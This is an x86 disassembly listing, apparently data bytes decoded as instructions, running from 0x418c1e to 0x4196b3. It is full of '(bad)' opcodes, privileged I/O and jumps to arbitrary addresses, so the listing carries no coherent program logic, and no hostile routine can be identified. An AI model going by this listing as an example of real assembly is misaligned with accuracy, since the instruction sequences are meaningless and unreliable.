  418c1e:	repz push edx
  418c20:	std    
  418c21:	push   edi
  418c22:	mov    ah,0xe
  418c24:	add    bh,bl
  418c26:	lods   eax,DWORD PTR ds:[esi]
  418c27:	out    0xd3,al
  418c29:	xor    esi,DWORD PTR ds:0x2df5951b
  418c2f:	test   bl,ch
  418c31:	sti    
  418c32:	test   eax,0xdde0f907
  418c37:	leave  
  418c38:	inc    esp
  418c39:	lods   eax,DWORD PTR ds:[esi]
  418c3a:	adc    DWORD PTR [esi+esi*4-0x5aace898],edx
  418c41:	cmp    esi,DWORD PTR [esi+0x280ef13f]
  418c47:	add    DWORD PTR [edx-0x63],esi
  418c4a:	mov    edi,0xc784df54
  418c4f:	xchg   esp,eax
  418c50:	mov    ds:0xa4eab250,eax
  418c55:	mov    esp,0xbafda6b8
  418c5a:	cwde   
  418c5b:	into   
  418c5c:	ficomp DWORD PTR [esi+ecx*8+0x6cab3062]
  418c63:	ins    DWORD PTR es:[edi],dx
  418c64:	mov    edi,0x9fac6b2
  418c69:	pop    eax
  418c6a:	stos   BYTE PTR es:[edi],al
  418c6b:	pop    esp
  418c6c:	xchg   edx,eax
  418c6d:	adc    al,0x31
  418c6f:	pop    es
  418c70:	clc    
  418c71:	call   0x8bfe59f3
  418c76:	in     al,0xd1
  418c78:	and    edx,edi
  418c7a:	mov    esi,0xf8c1b594
  418c7f:	or     edx,DWORD PTR [edi+0x19767b35]
  418c85:	shr    BYTE PTR [esi+0x50],1
  418c88:	push   ds
  418c89:	imul   BYTE PTR [edx-0x79ed1e7d]
  418c8f:	add    BYTE PTR [bx+si],al
	...
  418cf2:	add    BYTE PTR [eax],al
  418cf4:	sti    
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	shr    ch,cl
  418d01:	shr    BYTE PTR [ecx+0x106ac99],cl
  418d07:	add    BYTE PTR [ecx+eax*1],al
  418d0a:	add    BYTE PTR [eax],al
  418d0c:	mov    al,0xc6
  418d0e:	and    DWORD PTR [ebx*4-0x368f225b],esi
  418d15:	jnp    0x418d75
  418d17:	inc    edi
  418d18:	nop
  418d19:	xor    BYTE PTR [ecx-0x38],ah
  418d1c:	test   BYTE PTR [edi+0x59c63230],dl
  418d22:	aas    
  418d23:	mov    dl,0xe
  418d25:	or     edx,DWORD PTR [eax-0x3de6a0df]
  418d2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d2c:	mov    bh,0xfc
  418d2e:	pop    ebx
  418d2f:	or     eax,DWORD PTR [ebx-0x5957f2e5]
  418d35:	push   ebx
  418d36:	ret    0x286f
  418d39:	data16 jnp 0x418da3
  418d3c:	mov    al,ds:0xedb69e0d
  418d41:	add    esp,DWORD PTR [edi-0x68]
  418d44:	xchg   ebp,eax
  418d45:	push   edx
  418d46:	sub    ecx,DWORD PTR [eax]
  418d48:	jns    0x418d62
  418d4a:	ret    
  418d4b:	jle    0x418d48
  418d4d:	push   es
  418d4e:	loopne 0x418d7b
  418d50:	cld    
  418d51:	xchg   esp,eax
  418d52:	push   edx
  418d53:	add    ebx,ecx
  418d55:	dec    ebx
  418d56:	pop    ebp
  418d57:	add    DWORD PTR [esi+0x17],eax
  418d5a:	jne    0x418d38
  418d5c:	sahf   
  418d5d:	xor    DWORD PTR [ebp*2-0x2346d557],edi
  418d64:	test   eax,0x7fe91977
  418d69:	xchg   ebp,eax
  418d6a:	inc    ebp
  418d6b:	(bad)  
  418d6c:	xlat   BYTE PTR ds:[ebx]
  418d6d:	push   0xffffffa8
  418d6f:	stos   DWORD PTR es:[edi],eax
  418d70:	lods   al,BYTE PTR ds:[esi]
  418d71:	push   ss
  418d72:	jnp    0x418d7b
  418d74:	mov    eax,ds:0xf0f487e8
  418d79:	ret    0xf923
  418d7c:	or     eax,DWORD PTR [ebp-0x52610667]
  418d82:	(bad)  
  418d83:	mov    esi,esp
  418d85:	inc    esp
  418d86:	mov    ebp,0x547f8815
  418d8b:	aas    
  418d8c:	sbb    cl,bl
  418d8e:	or     edi,eax
  418d90:	push   es
  418d91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d92:	pop    ds
  418d93:	sbb    ecx,ebx
  418d95:	pop    ds
  418d96:	cmp    edx,DWORD PTR [edi+0x4a]
  418d99:	sar    DWORD PTR [edi-0x50],cl
  418d9c:	mov    dl,BYTE PTR [ebx]
  418d9e:	mov    dl,0x7b
  418da0:	fsubr  st(2),st
  418da2:	sbb    eax,0x59483416
  418da7:	mov    dl,0xf
  418da9:	and    DWORD PTR [esi-0x62a4c29],edx
  418daf:	int3   
  418db0:	add    eax,esi
  418db2:	aas    
  418db3:	jl     0x418dc7
  418db5:	fsub   DWORD PTR [ebx+0x4e1ca3d1]
  418dbb:	pop    esp
  418dbc:	sub    al,ah
  418dbe:	das    
  418dbf:	nop
  418dc0:	clc    
  418dc1:	(bad)  
  418dc2:	shl    cl,0xcd
  418dc5:	rcr    DWORD PTR [esi-0x21278a33],1
  418dcb:	cld    
  418dcc:	iret   
  418dcd:	and    DWORD PTR [ebp+0x2a],esp
  418dd0:	xchg   ecx,eax
  418dd1:	idiv   DWORD PTR [ebp+0x55bfbbd8]
  418dd7:	repz repnz daa 
  418dda:	sub    ah,0x89
  418ddd:	cmp    al,0x4
  418ddf:	addr16 clc 
  418de1:	ret    0x6dbc
  418de4:	loope  0x418dfd
  418de6:	jb     0x418d79
  418de8:	add    BYTE PTR [eax-0x4c],ah
  418deb:	mov    WORD PTR [edi+0x547f3ab6],ss
  418df1:	out    0xb0,al
  418df3:	mov    ecx,DWORD PTR ds:[ebx+0x47]
  418df7:	mov    eax,ds:0x5adc1e80
  418dfc:	push   eax
  418dfd:	aad    0x11
  418dff:	clc    
  418e00:	cwde   
  418e01:	outs   dx,DWORD PTR ds:[esi]
  418e02:	cmc    
  418e03:	fldcw  WORD PTR [ebx+0x892633a]
  418e09:	les    esp,FWORD PTR [ecx+esi*2+0x45fa6cc]
	...
  418e74:	push   cs
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx-0x48]
  418e81:	daa    
  418e82:	fs push 0x107b0
  418e88:	add    al,0x1
  418e8a:	add    BYTE PTR [eax],al
  418e8c:	xchg   ecx,eax
  418e8d:	adc    al,0xb0
  418e8f:	(bad)  
  418e90:	xor    ebx,DWORD PTR [edx-0x7a]
  418e93:	sub    al,0xcb
  418e95:	mov    cl,0x16
  418e97:	push   ds
  418e98:	ins    BYTE PTR es:[edi],dx
  418e99:	dec    edi
  418e9a:	mov    ebp,0xec0c2a1d
  418e9f:	std    
  418ea0:	xchg   esp,eax
  418ea1:	loop   0x418f04
  418ea3:	xlat   BYTE PTR ds:[ebx]
  418ea4:	das    
  418ea5:	dec    esi
  418ea6:	jl     0x418e51
  418ea8:	fcomp  QWORD PTR [eax-0x3c055565]
  418eae:	sbb    dh,BYTE PTR [ebp+0x2658ed20]
  418eb4:	ficomp DWORD PTR [esi-0x7b]
  418eb7:	mov    bh,0xa1
  418eb9:	jp     0x418e8b
  418ebb:	sbb    ebp,DWORD PTR [ebp+ebx*8-0x21cb7ee7]
  418ec2:	jns    0x418eb1
  418ec4:	retf   0xffb4
  418ec7:	sub    DWORD PTR [esi-0x27],ebp
  418eca:	test   DWORD PTR [edx+0x1b],0x24151361
  418ed1:	xchg   edi,eax
  418ed2:	bound  esi,QWORD PTR [ebp+0x7c824fea]
  418ed8:	pop    ebp
  418ed9:	push   es
  418eda:	jl     0x418ec7
  418edc:	inc    ebp
  418edd:	lea    ebp,[edi-0x20f92344]
  418ee3:	cmp    al,0x40
  418ee5:	sbb    BYTE PTR [ecx],cl
  418ee7:	shr    edi,1
  418ee9:	fisubr DWORD PTR [ecx*4-0x70aa3a34]
  418ef0:	and    ecx,eax
  418ef2:	jle    0x418ea9
  418ef4:	fmul   QWORD PTR [eax]
  418ef6:	mov    BYTE PTR [esi-0x4b8c23a8],bh
  418efc:	push   ds
  418efd:	jae    0x418efd
  418eff:	pop    edi
  418f00:	sbb    ch,BYTE PTR [ecx+0x639f27bf]
  418f06:	ffreep st(7)
  418f08:	ret    
  418f09:	repz pop eax
  418f0b:	retf   0xaf3a
  418f0e:	pop    es
  418f0f:	test   eax,0x20d4195d
  418f14:	cmc    
  418f15:	sub    BYTE PTR [ecx+0x11523181],bh
  418f1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f1c:	mov    bh,0x45
  418f1e:	shl    ch,cl
  418f20:	inc    ebx
  418f21:	jl     0x418f76
  418f23:	outs   dx,DWORD PTR ds:[esi]
  418f24:	inc    ebp
  418f25:	or     ebx,DWORD PTR [eax]
  418f27:	mov    eax,ds:0x6b469b5c
  418f2c:	add    al,0xb6
  418f2e:	xor    ch,BYTE PTR [eax+0x40]
  418f31:	bound  edx,QWORD PTR [ecx+esi*8]
  418f34:	and    esi,DWORD PTR [ecx+0x3f3073ec]
  418f3a:	je     0x418f64
  418f3c:	das    
  418f3d:	stos   BYTE PTR es:[edi],al
  418f3e:	add    eax,0xaea7656f
  418f43:	push   0x713ef246
  418f48:	jp     0x418f32
  418f4a:	lock cmp eax,DWORD PTR [edi+0x51bbcb93]
  418f51:	(bad)  
  418f52:	mov    bh,0xc0
  418f54:	jae    0x418f21
  418f56:	cli    
  418f57:	les    esp,FWORD PTR [esi]
  418f59:	loope  0x418f81
  418f5b:	adc    DWORD PTR [ebp-0x2fe272e9],esp
  418f61:	mov    esp,0xebf6b2bd
  418f66:	fcmovnbe st,st(5)
  418f68:	aaa    
  418f69:	scas   al,BYTE PTR es:[edi]
  418f6a:	xor    bh,ch
  418f6c:	jge    0x418ef4
  418f6e:	clc    
  418f6f:	mov    ebp,0x745826f8
  418f74:	test   BYTE PTR [edx+ecx*8+0x1027704d],ah
  418f7b:	xchg   esi,eax
  418f7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f7d:	int3   
  418f7e:	addr16 jle 0x418f7e
  418f81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f82:	out    dx,eax
  418f83:	fs aas 
  418f85:	sbb    dl,bl
  418f87:	leave  
  418f88:	cmc    
  418f89:	mov    al,ds:0x6b5fb48f
  418f8e:	sub    dl,BYTE PTR [edx]
	...
  418ff4:	sbb    al,0x97
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx+0x56eaf1a7]
  419001:	clc    
  419002:	jp     0x418fda
  419004:	mov    ah,0x8
  419006:	add    DWORD PTR [eax],eax
  419008:	add    al,0x1
  41900a:	add    BYTE PTR [eax],al
  41900c:	cli    
  41900d:	int3   
  41900e:	jns    0x418fe1
  419010:	push   ebx
  419011:	sbb    eax,0x4a754523
  419016:	enter  0x1d24,0x4e
  41901a:	sbb    DWORD PTR [esp+ebx*1+0x62],ecx
  41901e:	ins    DWORD PTR es:[edi],dx
  41901f:	adc    dh,BYTE PTR es:[esi+eax*1]
  419023:	cmc    
  419024:	sti    
  419025:	jp     0x418fe3
  419027:	fbld   TBYTE PTR [ecx]
  419029:	inc    ecx
  41902a:	cmp    eax,0xae4cf20e
  41902f:	mov    esp,ebp
  419031:	and    al,BYTE PTR [ecx+0x52e3ddf2]
  419037:	mov    edx,0x68ccca25
  41903c:	pop    esi
  41903d:	inc    eax
  41903e:	add    al,0xdf
  419040:	push   cs
  419041:	in     eax,dx
  419042:	cdq    
  419043:	add    al,BYTE PTR [edx-0x65]
  419046:	ret    
  419047:	mov    ebx,0x5d02b1b7
  41904c:	arpl   sp,di
  41904e:	jns    0x419059
  419050:	mov    dl,0x96
  419052:	stos   BYTE PTR es:[edi],al
  419053:	(bad)  
  419054:	mov    esi,0xd051e031
  419059:	jb     0x418ffd
  41905b:	ficom  DWORD PTR [eax-0x21f12e9b]
  419061:	add    eax,0x6e1eb640
  419066:	hlt    
  419067:	enter  0x67b6,0x61
  41906b:	jl     0x419087
  41906d:	mov    ebp,DWORD PTR [ebx+0x64672b97]
  419073:	imul   edx,DWORD PTR [ecx+0x14],0xffffffaa
  419077:	pusha  
  419078:	retf   0x9952
  41907b:	dec    esi
  41907c:	mov    ecx,0xe7067292
  419081:	into   
  419082:	pusha  
  419083:	(bad)  
  419084:	push   esp
  419085:	js     0x41909b
  419087:	loopne 0x41901a
  419089:	mov    eax,0x75173942
  41908e:	cld    
  41908f:	addr16 hlt 
  419091:	sub    BYTE PTR [esi],al
  419093:	lock (bad) 
  419095:	aam    0x7b
  419097:	(bad)  
  419098:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419099:	mov    es,WORD PTR [ecx]
  41909b:	stc    
  41909c:	sub    al,0x44
  41909e:	inc    ebx
  41909f:	retf   
  4190a0:	les    eax,FWORD PTR [edx+0x517c6f6b]
  4190a6:	mov    al,ds:0x15412eed
  4190ab:	cmp    BYTE PTR [eax],0x30
  4190ae:	mov    ds:0xc8fc3817,al
  4190b3:	inc    esi
  4190b4:	leave  
  4190b5:	lahf   
  4190b6:	bswap  edx
  4190b8:	dec    ecx
  4190b9:	and    al,0x49
  4190bb:	push   esi
  4190bc:	pop    eax
  4190bd:	mov    eax,ds:0x68043c09
  4190c2:	test   ebp,esi
  4190c4:	sar    esi,0x4c
  4190c7:	xchg   DWORD PTR [ebp+0x59],edx
  4190ca:	jl     0x419073
  4190cc:	seto   BYTE PTR gs:[eax+edi*1]
  4190d1:	sub    al,0x19
  4190d3:	rol    BYTE PTR [edi-0x24cef3bc],0x27
  4190da:	fcom   DWORD PTR [ecx]
  4190dc:	pushf  
  4190dd:	ins    BYTE PTR es:[edi],dx
  4190de:	addr16 xor al,0x87
  4190e1:	dec    edi
  4190e2:	sbb    eax,0x912b2aaf
  4190e7:	pushf  
  4190e8:	cmp    al,0xe6
  4190ea:	shl    DWORD PTR [edi+esi*1+0xb93515e],cl
  4190f1:	jl     0x419099
  4190f3:	or     DWORD PTR cs:[esi+0x1f0235aa],eax
  4190fa:	mov    eax,ds:0xfa2a1383
  4190ff:	add    ecx,DWORD PTR [esi-0x65]
  419102:	mov    cl,BYTE PTR [si]
  419105:	in     al,0xf6
  419107:	mov    dh,0x42
  419109:	clc    
  41910a:	out    dx,eax
  41910b:	loopne 0x4190f4
  41910d:	ss fwait
  41910f:	jmp    0x419114
	...
  419174:	scas   eax,DWORD PTR es:[edi]
  419175:	test   DWORD PTR [esi-0xa441be],ebx
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     dl,BYTE PTR [eax]
  419181:	(bad)  
  419182:	mov    esi,0x109b8dc
  419187:	add    BYTE PTR [ecx+eax*1],al
  41918a:	add    BYTE PTR [eax],al
  41918c:	lock sub eax,0x950a851c
  419192:	pushf  
  419193:	add    al,0x28
  419195:	in     al,0xff
  419197:	call   0x6ebcb9ce
  41919c:	lahf   
  41919d:	jbe    0x419134
  41919f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191a0:	jle    0x419214
  4191a2:	(bad)  
  4191a3:	and    edi,DWORD PTR [edx-0x46]
  4191a6:	jecxz  0x4191e5
  4191a8:	mov    edi,edx
  4191aa:	das    
  4191ab:	mov    al,0xba
  4191ad:	outs   dx,BYTE PTR ds:[esi]
  4191ae:	mov    DWORD PTR [esi],edi
  4191b0:	stos   BYTE PTR es:[edi],al
  4191b1:	sub    BYTE PTR [ebx+0x2e],cl
  4191b4:	jbe    0x41916f
  4191b6:	or     BYTE PTR ds:0xa5cfd7cf,al
  4191bc:	test   BYTE PTR [eax+0x45b9a8f0],cl
  4191c2:	(bad)  
  4191c3:	lahf   
  4191c4:	(bad)
  4191c7:	sub    dl,bl
  4191c9:	int    0xd4
  4191cb:	inc    ecx
  4191cc:	push   cs
  4191cd:	dec    ecx
  4191ce:	(bad)  
  4191d0:	test   BYTE PTR [ebx-0x68f74760],0x26
  4191d7:	dec    edi
  4191d8:	mov    ch,0x2
  4191da:	gs dec ebp
  4191dc:	aaa    
  4191dd:	dec    esp
  4191de:	push   0xd43d860f
  4191e3:	add    eax,0xbd204631
  4191e8:	shl    edx,1
  4191ea:	pop    ds
  4191eb:	xchg   BYTE PTR [ebx],al
  4191ed:	shl    BYTE PTR ds:0xd7347415,1
  4191f3:	pop    ss
  4191f4:	lock cld 
  4191f6:	sbb    BYTE PTR [eax+ebx*2+0x13c0b315],dl
  4191fd:	xlat   BYTE PTR ds:[ebx]
  4191fe:	sub    ecx,ecx
  419200:	inc    ebp
  419201:	mov    eax,0xba0f54fb
  419206:	daa    
  419207:	das    
  419208:	cmp    al,0x61
  41920a:	out    0x41,eax
  41920c:	jl     0x4191c9
  41920e:	pop    eax
  41920f:	dec    edx
  419210:	call   0xb87:0x5f819ea9
  419217:	cmp    eax,0x496422a4
  41921c:	push   ecx
  41921d:	mov    esp,0xd5f89c81
  419222:	aaa    
  419223:	vpclmulqdq xmm4,xmm1,XMMWORD PTR [edx],0x77
  419229:	(bad)  
  41922a:	in     eax,dx
  41922b:	loop   0x4192aa
  41922d:	or     DWORD PTR [eax+eax*2],ebp
  419230:	or     eax,0xb41028c6
  419235:	cmp    BYTE PTR [edi],cl
  419237:	add    BYTE PTR [ebx+0x592e25a7],0xd1
  41923e:	cwde   
  41923f:	jl     0x4192a0
  419241:	pop    esp
  419242:	adc    eax,0xa45f2678
  419247:	int    0xa3
  419249:	or     DWORD PTR [edi-0x23],esp
  41924c:	jg     0x4191ed
  41924e:	sahf   
  41924f:	mov    eax,ds:0x5d3b5857
  419254:	jle    0x41929b
  419256:	sbb    al,BYTE PTR [eax+0xa]
  419259:	xor    ah,0x3a
  41925c:	adc    BYTE PTR [esi],bl
  41925e:	sbb    al,0x80
  419260:	addr16 inc edi
  419262:	lea    ebp,[ecx]
  419264:	out    dx,eax
  419265:	xchg   edi,eax
  419266:	mov    al,0xe4
  419268:	xchg   ecx,eax
  419269:	push   esp
  41926a:	je     0x4192ea
  41926c:	gs cmc 
  41926e:	sub    dl,BYTE PTR [eax+0x4d]
  419271:	xchg   ebp,eax
  419272:	adc    dh,dh
  419274:	into   
  419275:	mov    cl,0x89
  419277:	jg     0x41922c
  419279:	adc    al,cl
  41927b:	pop    edx
  41927c:	outs   dx,DWORD PTR ds:[esi]
  41927d:	push   ds
  41927e:	mov    bh,al
  419280:	fwait
  419281:	add    al,0x4a
  419283:	es sbb al,0x44
  419286:	mov    ecx,0xb74aa719
  41928b:	outs   dx,BYTE PTR ds:[esi]
  41928c:	dec    ebx
  41928d:	mov    al,ds:0xd13e
	...
  4192f2:	add    BYTE PTR [eax],al
  4192f4:	mov    al,ds:0xff33bae7
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	pop    edi
  419301:	inc    edi
  419302:	jne    0x4192d3
  419304:	mov    esp,0x400010a
  419309:	add    DWORD PTR [eax],eax
  41930b:	add    BYTE PTR [ebp-0x55fc7792],ch
  419311:	scas   eax,DWORD PTR es:[edi]
  419312:	jno    0x41938a
  419314:	loope  0x4192c6
  419316:	fidivr DWORD PTR [esi-0x148b148e]
  41931c:	retf   
  41931d:	push   ebp
  41931e:	and    DWORD PTR [edx+0x61206e99],edx
  419324:	popa   
  419325:	dec    eax
  419326:	(bad)  
  419327:	push   ecx
  419328:	into   
  419329:	jmp    0x974a:0xad1f2aad
  419330:	sbb    al,0x89
  419332:	push   esp
  419333:	fild   DWORD PTR [edi+eiz*8+0x3f234acc]
  41933a:	mov    edx,0x34a5c424
  41933f:	dec    ebp
  419340:	and    cl,BYTE PTR [ecx+0x69]
  419343:	fisub  DWORD PTR [ebp+0x4e]
  419346:	ja     0x4192db
  419348:	aaa    
  419349:	repnz mov al,0x76
  41934c:	ins    BYTE PTR es:[edi],dx
  41934d:	mov    edi,0xcd5ec7ce
  419352:	clc    
  419353:	imul   BYTE PTR [eax-0x5d67c289]
  419359:	sbb    DWORD PTR [ebx],esp
  41935b:	fnstsw WORD PTR [ebx+0x1a5883cf]
  419361:	nop
  419362:	jg     0x419347
  419364:	xor    eax,0x59cb05c5
  419369:	sub    BYTE PTR [esp+ebx*4+0x3f64c751],dl
  419370:	jg     0x41939e
  419372:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419373:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419374:	adc    eax,0xd79a892
  419379:	jne    0x4193d0
  41937b:	sbb    ch,BYTE PTR [edi-0x6c]
  41937e:	leave  
  41937f:	xor    BYTE PTR [edx+0x424f7883],ch
  419385:	addr16 call 0xdd26b402
  41938b:	(bad)  
  41938c:	pop    ds
  41938d:	mov    edi,0x870afd66
  419392:	clc    
  419393:	sbb    ch,BYTE PTR ds:0xda6fee24
  419399:	push   ecx
  41939a:	loop   0x41936b
  41939c:	outs   dx,DWORD PTR ds:[esi]
  41939d:	mov    edx,0x851eff59
  4193a2:	lock xchg BYTE PTR [eax],bl
  4193a5:	rcl    DWORD PTR [esi+0xb],1
  4193a8:	add    BYTE PTR [ebx+0x17b50b14],bh
  4193ae:	sti    
  4193af:	cmp    al,BYTE PTR [edi]
  4193b1:	mov    esi,0x6fe184ea
  4193b6:	xchg   ebx,eax
  4193b7:	or     BYTE PTR [edx-0x2a682e49],bh
  4193bd:	push   0xb66dda66
  4193c2:	pop    es
  4193c3:	sbb    cl,BYTE PTR ds:0xb9c5cfa9
  4193c9:	dec    esp
  4193ca:	(bad)  
  4193cb:	dec    ebp
  4193cc:	pop    eax
  4193cd:	(bad)  [ebp-0x43]
  4193d0:	xchg   esi,eax
  4193d1:	loop   0x41943a
  4193d3:	ret    0x64c5
  4193d6:	cdq    
  4193d7:	xchg   ebp,eax
  4193d8:	imul   esi,DWORD PTR [esi-0x2c6955f0],0xffffff8f
  4193df:	in     al,dx
  4193e0:	pop    es
  4193e1:	fdiv   DWORD PTR ss:[eax]
  4193e4:	pop    es
  4193e5:	adc    eax,0xc7975f9e
  4193ea:	(bad)  
  4193eb:	gs jbe 0x41942d
  4193ee:	push   es
  4193ef:	int    0x98
  4193f1:	ret    0x1d8f
  4193f4:	test   al,0xd
  4193f6:	inc    ebx
  4193f7:	cmp    DWORD PTR [edx-0x7499d74c],esi
  4193fd:	and    eax,edi
  4193ff:	pop    edx
  419400:	aas    
  419401:	test   al,0x89
  419403:	push   0x78
  419405:	mov    ds:0xbd7cacfd,eax
  41940a:	rcl    DWORD PTR [ebx],0x24
  41940d:	or     esi,esi
  41940f:	add    BYTE PTR ds:[eax],al
	...
  419472:	add    BYTE PTR [eax],al
  419474:	cmp    eax,0xed3a6998
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	cmp    esi,ebp
  419482:	call   0x14d54ea
  419487:	add    BYTE PTR [ecx+eax*1],al
  41948a:	add    BYTE PTR [eax],al
  41948c:	popa   
  41948d:	das    
  41948e:	adc    ebp,edx
  419490:	loopne 0x4194a4
  419492:	xor    al,0x4
  419494:	adc    ecx,DWORD PTR [edx]
  419496:	iret   
  419497:	push   es
  419498:	push   ebp
  419499:	push   0x76
  41949b:	push   eax
  41949c:	cmp    esp,ebp
  41949e:	inc    ebx
  41949f:	inc    esi
  4194a0:	(bad)  
  4194a1:	or     DWORD PTR [edi-0x4c],ebx
  4194a4:	outs   dx,BYTE PTR ds:[esi]
  4194a5:	int    0xf4
  4194a7:	sub    al,0xad
  4194a9:	arpl   WORD PTR [eax],di
  4194ab:	dec    edi
  4194ac:	test   ch,dh
  4194ae:	mov    bl,0x7c
  4194b0:	sbb    eax,0x6609e03
  4194b5:	mov    dl,0xa0
  4194b7:	out    dx,al
  4194b8:	mov    BYTE PTR [eax+0x3a5ba9fd],al
  4194be:	es addr16 mov dh,0xbb
  4194c2:	idiv   edi
  4194c4:	pushf  
  4194c5:	pop    eax
  4194c6:	into   
  4194c7:	xchg   BYTE PTR [ebp-0x64],bl
  4194ca:	jecxz  0x41944e
  4194cc:	(bad)  
  4194cd:	xor    eax,0xffdf0745
  4194d2:	pop    ds
  4194d3:	jl     0x4194ac
  4194d5:	mov    WORD PTR [ecx+0x41],?
  4194d8:	(bad)  
  4194d9:	jmp    0xebdf1006
  4194de:	stc    
  4194df:	xor    eax,0x5ed88fdf
  4194e4:	int    0x1a
  4194e6:	jns    0x419498
  4194e8:	outs   dx,WORD PTR ds:[esi]
  4194ea:	push   ss
  4194eb:	jne    0x419565
  4194ed:	mov    DWORD PTR [ebx+0xa62ca5f],esp
  4194f3:	jmp    0x419507
  4194f5:	ror    BYTE PTR [edx],cl
  4194f7:	sar    ebp,1
  4194f9:	adc    ecx,DWORD PTR [ebx]
  4194fb:	test   ah,dh
  4194fd:	add    BYTE PTR [ebp+0x28],cl
  419500:	loop   0x4194d0
  419502:	push   esi
  419503:	retf   0x78e9
  419506:	imul   DWORD PTR [edi+ebp*8]
  419509:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41950a:	mov    cl,0xc6
  41950c:	inc    ebx
  41950d:	pop    edi
  41950e:	add    al,0x1e
  419510:	aam    0x4e
  419512:	xchg   ecx,eax
  419513:	mov    ch,0x7c
  419515:	repnz daa 
  419517:	push   esp
  419518:	hlt    
  419519:	jbe    0x4194d2
  41951b:	in     al,0xf2
  41951d:	adc    eax,0x2e445646
  419522:	in     eax,dx
  419523:	inc    eax
  419524:	mov    ecx,0x3256c675
  419529:	xor    eax,0xf53fce30
  41952e:	clc    
  41952f:	sub    dl,BYTE PTR [esi-0x2efa00e5]
  419535:	xor    BYTE PTR [eax],0x87
  419538:	imul   esp,DWORD PTR [edx],0xd4df2d0d
  41953e:	repz push edx
  419540:	aad    0x40
  419542:	xor    al,BYTE PTR [eax+0x885221]
  419548:	push   eax
  419549:	cmp    ecx,DWORD PTR [esi]
  41954b:	bound  esi,QWORD PTR [edx]
  41954d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41954e:	inc    ebx
  41954f:	xor    ebp,edi
  419551:	adc    eax,0x50ec3f2f
  419556:	or     BYTE PTR [eax+0x277438],0xb2
  41955d:	cmp    eax,esi
  41955f:	adc    BYTE PTR [ecx-0x57],ch
  419562:	stos   BYTE PTR es:[edi],al
  419563:	mov    dh,0xce
  419565:	mov    edi,0xe44ab5fc
  41956a:	add    edi,DWORD PTR [ebp-0x7f56389a]
  419570:	(bad)  
  419571:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419572:	dec    ecx
  419573:	call   0x5b2b:0x234935c8
  41957a:	jno    0x4195ab
  41957c:	xor    eax,0xe7cb35b7
  419581:	stos   DWORD PTR es:[edi],eax
  419582:	fwait
  419583:	daa    
  419584:	int    0xff
  419586:	hlt    
  419587:	test   DWORD PTR [ecx+0x34],eax
  41958a:	push   ss
  41958b:	cmp    al,dh
  41958d:	pop    esi
  41958e:	adc    eax,DWORD PTR [esi]
	...
  4195f4:	scas   eax,DWORD PTR es:[edi]
  4195f5:	aam    0x8d
  4195f7:	(bad)  
  4195f8:	(bad)  
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	xor    ebp,edi
  419602:	enter  0xc473,0xc
  419606:	add    DWORD PTR [eax],eax
  419608:	add    al,0x1
  41960a:	add    BYTE PTR [eax],al
  41960c:	jge    0x419594
  41960e:	jmp    0x415c7d2b
  419613:	loope  0x41967c
  419615:	iret   
  419616:	mov    ecx,?
  419618:	or     DWORD PTR fs:[edx-0x6ecadc0a],0xf1b15e39
  419623:	cmp    BYTE PTR [ebx+0x9824e6d],cl
  419629:	push   ebp
  41962a:	lock add ecx,DWORD PTR [ecx-0x2b807727]
  419631:	mov    dh,0x8b
  419633:	jle    0x419624
  419635:	addr16 dec eax
  419637:	xor    dl,ch
  419639:	(bad)  
  41963a:	cmc    
  41963b:	int3   
  41963c:	xchg   esp,eax
  41963d:	inc    ebx
  41963e:	not    DWORD PTR [ecx-0x5b]
  419641:	inc    DWORD PTR [ecx]
  419643:	inc    esp
  419644:	ins    DWORD PTR es:[edi],dx
  419645:	loopne 0x419637
  419647:	fadd   DWORD PTR [ebp+0x26]
  41964a:	fisubr DWORD PTR [edx+ebx*2-0x6110f348]
  419651:	xor    BYTE PTR [edx-0x176a5587],bh
  419657:	xor    al,0xc3
  419659:	imul   esp,DWORD PTR [ebx-0x5c],0x305e063e
  419660:	mov    dh,ah
  419662:	pushf  
  419663:	and    BYTE PTR [eax+0x17fe2b88],cl
  419669:	or     BYTE PTR [eax+0x44172193],dh
  41966f:	mov    dl,0x61
  419671:	pushf  
  419672:	fadd   DWORD PTR [esi-0x68d9c743]
  419678:	(bad)  
  419679:	push   esi
  41967a:	jle    0x419683
  41967c:	popf   
  41967d:	sbb    ah,0x57
  419680:	xchg   edx,eax
  419681:	loope  0x419624
  419683:	xchg   BYTE PTR [ebx+0x7faef10d],bh
  419689:	mov    edi,0xaa1fe5b0
  41968e:	out    dx,al
  41968f:	into   
  419690:	loopne 0x419670
  419692:	cmp    DWORD PTR ds:[edx-0x4ec68fe2],0xffffffb3
  41969a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41969b:	pop    es
  41969c:	cld    
  41969d:	loope  0x41962c
  41969f:	stc    
  4196a0:	in     eax,0x3
  4196a2:	mov    bh,0x47
  4196a4:	adc    bh,BYTE PTR [eax-0xe]
  4196a7:	pop    es
  4196a8:	loope  0x419650
  4196aa:	cmp    eax,0xc2f5a0e0
  4196af:	xchg   BYTE PTR [eax+ebx*1+0x7f],dl
  4196b3:	cli    
